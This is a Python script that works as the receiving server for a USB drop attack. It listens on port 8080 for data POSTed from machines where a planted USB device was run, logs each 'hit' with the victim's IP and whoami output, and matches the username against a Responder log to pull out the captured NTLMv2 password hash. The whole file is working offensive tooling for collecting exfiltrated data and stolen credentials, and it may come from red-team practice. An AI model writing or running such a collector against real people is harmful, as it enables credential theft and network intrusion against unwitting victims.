#!/usr/bin/env python3
import http.server
import socketserver
import datetime
import re
import os
import time

PORT = 8080
LOGFILE = "usb_drop_logs.txt"
RESPONDER_LOG = "/home/ubuntu/Responder/logs/Responder-Session.log"

class Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        raw_post_data = self.rfile.read(content_length).decode(errors='ignore')

        # Remove multipart/form-data noise
        cleaned_lines = []
        for line in raw_post_data.splitlines():
            if not (line.startswith("------") or line.startswith("Content-Disposition") or line.startswith("Content-Type")):
                cleaned_lines.append(line)
        clean_data = "\n".join(cleaned_lines).strip()

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_ip = self.client_address[0]

        entry = f"\n=== Successful USB Hit from {client_ip} @ {timestamp} ===\n"
        entry += clean_data + "\n\n[Responder]\n"

        # Extract username from WHOAMI section
        username_match = re.search(r'\\([\w.-]+)', clean_data)
        username = username_match.group(1).lower() if username_match else None

        responder_hit = "No Responder hit found for this target."
        if username:
            time.sleep(2)
            try:
                if os.path.exists(RESPONDER_LOG):
                    with open(RESPONDER_LOG, 'r', encoding='utf-8', errors='ignore') as rlog:
                        lines = rlog.readlines()
                        for i in range(len(lines) - 1):
                            if "NTLMv2-SSP Username" in lines[i] and username in lines[i].lower():
                                for j in range(i + 1, min(i + 5, len(lines))):
                                    if "NTLMv2-SSP Hash" in lines[j]:
                                        responder_hit = f"Successful Responder hit: {lines[j].split(':', 1)[-1].strip()}"
                                        break
            except Exception as e:
                responder_hit = f"Error reading Responder log: {e}"

        entry += responder_hit + "\n"

        print(entry)
        with open(LOGFILE, "a") as f:
            f.write(entry)

        self.send_response(200)
        self.end_headers()

    def log_message(self, format, *args):
        return

def run():
    if os.geteuid() != 0:
        print("[!] This script must be run as root (sudo) to read Responder logs.")
        exit(1)

    print("[*] USB Drop Listener")
    print(f"[*] Listening on port {PORT}")
    print(f"[*] Logging to ./{LOGFILE}")
    input("[?] Have you started Responder on this server? (y/n): ")
    print("[*] Waiting for incoming connections... Press Ctrl+C to stop.\n")

    with socketserver.TCPServer(("", PORT), Handler) as server:
        server.serve_forever()

if __name__ == "__main__":
    run()
